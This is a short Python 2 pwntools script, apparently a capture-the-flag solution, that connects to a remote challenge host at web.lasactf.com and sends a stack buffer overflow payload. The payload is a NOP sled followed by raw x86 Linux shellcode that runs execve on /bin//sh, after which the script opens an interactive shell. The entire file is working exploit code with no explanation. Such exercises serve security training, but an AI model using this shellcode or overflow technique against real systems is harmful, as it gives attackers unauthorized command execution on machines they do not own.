#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
from struct import pack, unpack


count = 0
# conn = process("./overflow")
conn = remote("web.lasactf.com", 47050) 

# Welcome message
print conn.recvuntil("\n")

payload = '\x90'*(0xf6 - 0xc1) 

payload +=  '\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\x50\x89\xe2\xb0\x0b\xcd\x80\xb0\x3c\x31\xdb\xcd\x80'


conn.sendline(payload)
# conn.recvuntil("\n")
# conn.recvuntil("\n")
# print conn.recvuntil("\n")
# print conn.recv()
conn.interactive()
conn.close()



